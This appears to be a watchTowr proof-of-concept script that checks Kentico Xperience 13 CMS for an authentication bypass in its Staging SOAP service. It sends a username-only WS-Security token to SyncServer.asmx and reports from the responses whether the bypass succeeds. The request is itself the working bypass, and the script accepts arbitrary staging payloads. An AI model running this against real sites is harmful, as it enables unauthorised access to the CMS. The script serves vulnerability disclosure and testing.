import argparse
import urllib3

import requests

banner = """			 __         ___  ___________                   
	 __  _  ______ _/  |__ ____ |  |_\\__    ____\\____  _  ________ 
	 \\ \\/ \\/ \\__  \\    ___/ ___\\|  |  \\|    | /  _ \\ \\/ \\/ \\_  __ \\
	  \\     / / __ \\|  | \\  \\___|   Y  |    |(  <_> \\     / |  | \\/
	   \\/\\_/ (____  |__|  \\___  |___|__|__  | \\__  / \\/\\_/  |__|   
				  \\/          \\/     \\/                            
	  
        watchTowr-vs-kentico-xperience13-AuthBypass-wt-2025-0011.py
        (*) WT-2025-0011: Kentico Xperience 13 CMS - Staging Service Authentication Bypass Check

          - Piotr Bazydlo (@chudyPB) of watchTowr 

        CVEs: TBD  
"""

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def detect(host, user):

    url = host + 'CMSPages/Staging/SyncServer.asmx'

    verify_auth(url, user)

def payload_gen(user, payload = str()):

    if not payload:
        payload = """<![CDATA[<watchTowr>]]>"""
    

    msg = """<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Header>
            <wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
                <wsse:UsernameToken>
                    <wsse:Username>%s</wsse:Username>
                </wsse:UsernameToken>
            </wsse:Security>
        </soap:Header>
        <soap:Body>
            <ProcessSynchronizationTaskData xmlns="http://localhost/SyncWebService/SyncServer">
                <stagingTaskData>%s</stagingTaskData>
            </ProcessSynchronizationTaskData>
        </soap:Body>
    </soap:Envelope>""" % (user, payload)

    return msg

def verify_auth(url, user):

    print('[+] Verifying Authentication Bypass in Staging API')
    headers = {"Content-Type": "text/xml; charset=utf-8", "SOAPAction": "\"http://localhost/SyncWebService/SyncServer/ProcessSynchronizationTaskData\""}

    resp = requests.post(url, headers = headers, data = payload_gen(user), verify = False)

    if 'watchTowr' in resp.text:
        print('[+] VULNERABLE: Authentication Bypassed!')
    elif 'Site not running' in resp.text:
        print('[+] VULNERABLE: Authentication Bypassed, but this site is not running! Try to pick another page on this target.')
    elif 'SyncServer.ErrorLicense' in resp.text or 'SyncServer.ErrorServiceNotEnabled' in resp.text:
        print('[+] VULNERABLE: Authentication Bypassed, but your target does not have a valid license, kek.')
    elif 'Staging service is not enabled on this server' in resp.text:
        print('[-] NOT VULNERABLE: Staging Service seems to be disabled')
    elif 'Staging does not work with blank password' in resp.text:
        print('[-] NOT VULNERABLE: Staging enabled, but password not defined for user')
    elif 'Missing X509 certificate token' in resp.text:
        print('[-] NOT VULNERABLE: Staging enabled with X509 authentication')
    elif 'The security token could not be authenticated or authorized' in resp.text:
        print('[-/+] Vague: Probably vulnerable, but you have provided a wrong username')
    else:
        print('[-] NOT VULNERABLE: Some unknown error appeared (probably patched with Hotfix 178)')

    return

if __name__ == "__main__":

    print(banner)

    parser = argparse.ArgumentParser()

    parser.add_argument('-H', dest = 'host', action = "store", type = str, help = 'Host, like "https://target/Kentico13_Admin" or "https://target"', required = True)
    parser.add_argument('-u', dest = 'user', action = "store", type = str, help = 'Valid username, like: "admin" (default Kentico password is "admin")', required = False, default = 'admin')

    args = parser.parse_args()
    host = args.host
    user = args.user

    if host[-1] != '/':
        host += '/'

    detect(host, user)